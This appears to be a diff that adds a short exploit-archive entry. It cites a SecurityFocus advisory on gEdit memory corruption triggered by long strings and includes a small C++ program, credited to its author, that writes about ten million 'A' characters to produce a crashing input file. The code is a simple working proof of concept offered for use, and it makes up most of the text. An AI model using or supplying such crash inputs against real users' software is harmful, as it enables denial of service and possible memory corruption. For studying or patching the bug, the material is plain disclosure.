@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/9090/info
+
+A problem has been reported in the handling of certain file types by gEdit. Memory corruption may occur when handling files containing long strings. Because of this, it may be possible to cause memory corruption. 
+
+/*
+        simple buffer overflow generator by MegaHz megahz@megahz.org
+*/
+#include <iostream>
+using namespace std;
+
+int main()
+{
+int i;
+for (i=0;i<=9999999;i++)
+        {
+        cout << "A";
+        }
+        return 0;
+}
+
